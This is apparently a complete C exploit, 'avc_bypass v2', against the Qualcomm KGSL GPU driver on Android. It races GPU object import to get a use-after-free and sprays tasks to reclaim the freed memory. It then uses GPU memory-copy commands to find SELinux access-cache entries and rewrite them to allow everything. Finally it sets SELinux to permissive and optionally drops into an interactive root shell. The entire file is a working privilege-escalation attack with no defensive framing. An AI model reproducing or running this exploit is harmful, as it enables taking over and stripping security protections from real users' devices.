#include "avc_bypass.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/sysmacros.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <dirent.h>
#include <time.h>
#include <signal.h>

#define CHURN_MAX_PATHS 20000

static int kgsl_fd = -1;
static volatile int race_done = 0;
static uint64_t alloc_flags = 0;
static int uaf_id = -1, ph_id = -1;

static void die(const char *msg) { perror(msg); exit(1); }

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static void phase1_rbtree(void) {
    alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");

    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
        (unsigned long)PLACEHOLDER_ADDR);
}

static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

static int phase2_race(void) {
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);
    if (!hit) { printf("[-] Race failed\n"); return 0; }
    printf("[+] Race won!\n");
    return 1;
}

static void phase3_free_uaf(void) {
    gpuobj_free(uaf_id);
    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
}

static void phase4_reclaim(void) {
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);
}

static const char *churn_dirs[] = {
    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
    "/dev", "/proc",
};

static char churn_paths[CHURN_MAX_PATHS][160];
static int churn_npaths = 0;
static int churn_built = 0;

static void churn_walk(const char *dir, int depth) {
    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
        if (de->d_name[0] == '.') continue;
        char p[192];
        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
        int fd = open(p, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
        churn_npaths++;
        churn_walk(p, depth + 1);
    }
    closedir(d);
}

static void churn_build(void) {
    if (churn_built) return;
    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
         churn_npaths < CHURN_MAX_PATHS; d++) {
        churn_walk(churn_dirs[d], 0);
    }
    churn_built = 1;
    printf("[CHURN] %d paths\n", churn_npaths);
}

static void churn_round(void) {
    churn_build();
    for (int i = 0; i < churn_npaths; i++) {
        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
    }
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) { close(s); }
    s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s >= 0) {
        struct sockaddr_un su = { .sun_family = AF_UNIX };
        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
        bind(s, (struct sockaddr *)&su, sizeof(su));
        close(s);
        unlink("/data/local/tmp/cs.sock");
    }
    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
}

static int avc_entries(void) {
    int fd = open("/sys/fs/selinux/avc/hash_stats", O_RDONLY);
    if (fd < 0) return -1;
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = 0;
    int e = -1;
    if (sscanf(buf, "entries: %d", &e) != 1) return -1;
    return e;
}

static int try_setenforce0(void) {
    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
    if (fd < 0) return 0;
    ssize_t w = write(fd, "0", 1);
    close(fd);
    return (w == 1);
}

#define PRE_SCAN_DWORDS 560
#define PRE_PAGES_PER_IB 4

static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                              void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                              uint64_t scan_start, uint64_t end_va,
                              uint64_t *out_vas, int maxout) {
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
    int n = 0, dw;
    unsigned int ts;
    uint64_t va = scan_start;
    while (va < end_va && n < maxout) {
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, PRE_PAGES_PER_IB * PRE_SCAN_DWORDS * 4);
        dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        int batch = 0;
        if (((va - scan_start) & 0xFFFFF) == 0) { printf("."); fflush(stdout); }
        for (; batch < PRE_PAGES_PER_IB && va < end_va; batch++, va += 0x1000) {
            for (int w = 0; w < PRE_SCAN_DWORDS; w++) {
                uint32_t dl, dh, sl, sh;
                split64(dst_ga + (batch * PRE_SCAN_DWORDS + w) * 4, &dl, &dh);
                split64(va + w * 4, &sl, &sh);
                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                cmd[dw++] = sl; cmd[dw++] = sh;
            }
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(ctx_id, ts) < 0) break;
        __sync_synchronize();
        uint64_t pva = va - batch * 0x1000;
        for (int p = 0; p < batch; p++) {
            uint32_t *pd = &data[p * PRE_SCAN_DWORDS];
            int found = 0;
            for (int i = 0; i < PRE_SCAN_DWORDS - 1 && !found; i++)
                if (pd[i] == 0x4B534154 && pd[i+1] == 0x21464155) found = 1;
            if (found && n < maxout) {
                out_vas[n++] = pva + p * 0x1000;
                printf("[TASKPG] va=0x%lx\n", (unsigned long)(pva + p * 0x1000));
            }
        }
    }
    return n;
}

static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                           void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                           uint64_t *vas, int npages, int verbose) {
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
    int total_flips = 0, idx = 0;
    unsigned int ts;

    while (idx < npages) {
        int batch = npages - idx;
        if (batch > AVC_PAGES_PER_IB) batch = AVC_PAGES_PER_IB;
        int node_dws = batch * AVC_NODES_PER_PAGE * 4;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, node_dws * 4);
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int p = 0; p < batch; p++) {
            uint64_t va = vas[idx + p];
            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
                uint64_t node_va = va + n * AVC_NODE_STRIDE;
                uint32_t dofs = (p * AVC_NODES_PER_PAGE + n) * 4;
                for (int w = 0; w < 4; w++) {
                    uint32_t dl, dh, sl, sh;
                    split64(dst_ga + (dofs + w) * 4, &dl, &dh);
                    split64(node_va + w * 4, &sl, &sh);
                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                    cmd[dw++] = sl; cmd[dw++] = sh;
                }
            }
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(ctx_id, ts) < 0) break;
        __sync_synchronize();

        int fdw = 0, nb_flips = 0;
        uint32_t *fcmd = (uint32_t *)ib_m;
        fcmd[fdw++] = cp_type7(CP_NOP, 0);
        for (int p = 0; p < batch; p++) {
            uint64_t va = vas[idx + p];
            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
                uint32_t *nd = &data[(p * AVC_NODES_PER_PAGE + n) * 4];
                if (nd[0] >= 1 && nd[0] <= 0x3fff && nd[1] == 2 && nd[2] == 1) {
                    uint64_t node_va = va + n * AVC_NODE_STRIDE + 0xc;
                    uint32_t sl, sh;
                    split64(node_va, &sl, &sh);
                    fcmd[fdw++] = cp_type7(CP_MEM_WRITE, 4);
                    fcmd[fdw++] = sl; fcmd[fdw++] = sh;
                    fcmd[fdw++] = 0xffffffff;
                    fcmd[fdw++] = 0;
                    nb_flips++;
                    if (verbose)
                        printf("[FLIP] va=0x%lx+0x%x sid=0x%x ts=0x%x allowed->0xffffffff\n",
                            (unsigned long)va, n * AVC_NODE_STRIDE + 0xc,
                            nd[0], nd[1]);
                }
            }
        }
        if (nb_flips > 0) {
            fcmd[fdw++] = cp_type7(CP_NOP, 0);
            __sync_synchronize();
            if (submit_ib(ctx_id, ib_ga, fdw*4, ib_id, &ts) == 0)
                wait_timestamp(ctx_id, ts);
        }
        total_flips += nb_flips;
        idx += batch;
    }
    return total_flips;
}

static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(void) {
    printf("[SPRAY] spawning...\n");
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (;;) usleep(200000);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    printf("[SPRAY] %d children\n", n_spray);
}

static void kill_spray_children(void) {
    int killed = 0;
    for (int i = 0; i < n_spray; i++) {
        kill(spray_pids[i], SIGKILL);
        killed++;
    }
    while (waitpid(-1, NULL, 0) > 0) ;
    printf("[KILL] %d spray children killed+reaped\n", killed);
}

static void root_shell(void) {
    printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
    fflush(stdout);
    char buf[512];
    while (fgets(buf, sizeof(buf), stdin) != NULL) {
        if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "quit", 4) == 0) break;
        buf[strcspn(buf, "\n")] = 0;
        if (buf[0] == 0) continue;
        int st = system(buf);
        (void)st;
        printf("# ");
        fflush(stdout);
    }
    printf("[-] Root shell exited\n");
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    bool want_shell = false;
    for (int i = 1; i < argc; i++)
        if (strcmp(argv[i], "-i") == 0) want_shell = true;

    printf("[*] avc_bypass v2: uid=%d euid=%d\n", getuid(), geteuid());
    {
        int fd = open("/proc/self/attr/current", O_RDONLY);
        if (fd >= 0) {
            char ctx[256]; ssize_t n = read(fd, ctx, sizeof(ctx) - 1);
            close(fd);
            if (n > 0) { ctx[n] = 0; printf("[*] SELinux: %s\n", ctx); }
        }
    }

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    printf("[*] Phase 1: Setup rbtree\n");
    phase1_rbtree();

    printf("[*] Phase 2: Race\n");
    if (!phase2_race()) { close(kgsl_fd); return 1; }

    printf("[*] Phase 3: Free UAF\n");
    phase3_free_uaf();

    printf("[*] Phase 4: Reclaim\n");
    phase4_reclaim();

    spawn_spray();

    unsigned int ctx_id = create_context();
    printf("[GPU] context=%u\n", ctx_id);

    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);

    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga);

    printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);

    {
        uint32_t *cmd = (uint32_t *)ib_m;
        int dw = 0;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < 256; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i * 4, &dl, &dh);
            split64(UAF_ADDR + 0x2000 + i * 4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        int nz = 0;
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
            wait_timestamp(ctx_id, ts);
            __sync_synchronize();
            uint32_t *data = (uint32_t *)dst_m;
            for (int i = 0; i < 256; i++) if (data[i] != 0) nz++;
        }
        printf("[UAF] sanity: nonzero dwords=%d/256 %s\n", nz,
            nz > 0 ? "(UAF alive)" : "(UAF looks empty)");
    }

    uint64_t task_pgs[4096];
    int n_task_pgs = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
        UAF_ADDR + 0x2000, UAF_ADDR + UAF_SIZE - 0x1000, task_pgs, 4096);
    printf("[*] pre-scan: %d task pages\n", n_task_pgs);

    kill_spray_children();
    usleep(100000);
    churn_build();
    for (int c = 0; c < 3; c++) churn_round();
    printf("[AVC] entries=%d (post-churn)\n", avc_entries());

    int flip_total = 0;
    int ok = 0;
    uint64_t t_start = time(NULL);
    uint64_t t_last_report = t_start;
    while (!ok && time(NULL) - t_start < AVC_LOOP_SECONDS) {
        int f1 = 0, f2 = 0;
        for (int i = n_task_pgs - 1; i >= 0; i -= AVC_PAGES_PER_IB) {
            int batch = (i + 1) >= AVC_PAGES_PER_IB ? AVC_PAGES_PER_IB : (i + 1);
            f1 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
                                  &task_pgs[i - batch + 1], batch, 1);
            if (try_setenforce0()) { ok = 1; break; }
        }
        if (!ok) {
            for (uint64_t va = UAF_ADDR + 0x2000;
                 va < UAF_ADDR + UAF_SIZE - 0x1000;
                 va += AVC_PAGES_PER_IB * 0x1000) {
                uint64_t vas[AVC_PAGES_PER_IB];
                int nb = 0;
                for (int i = 0; i < AVC_PAGES_PER_IB &&
                     va + (uint64_t)i * 0x1000 < UAF_ADDR + UAF_SIZE - 0x1000; i++)
                    vas[nb++] = va + (uint64_t)i * 0x1000;
                f2 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
                                      vas, nb, 1);
                if (try_setenforce0()) { ok = 1; break; }
            }
        }
        flip_total += f1 + f2;
        if (!ok) {
            churn_round();
            if (avc_entries() >= 0)
                printf("[AVC] entries=%d\n", avc_entries());
            if (try_setenforce0()) ok = 1;
        }
        if (time(NULL) - t_last_report >= 5) {
            printf("[*] t=%lus flips=%d ok=%d\n",
                (unsigned long)(time(NULL) - t_start), flip_total, ok);
            t_last_report = time(NULL);
        }
    }

    if (ok) {
        printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
    } else {
        printf("[-] AVC bypass failed (flips=%d, 90s timeout)\n", flip_total);
    }
    {
        int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (fd >= 0) {
            char v[8]; ssize_t n = read(fd, v, sizeof(v) - 1);
            close(fd);
            if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
        }
    }

    if (want_shell && getuid() == 0) root_shell();
    return ok ? 0 : 1;
}
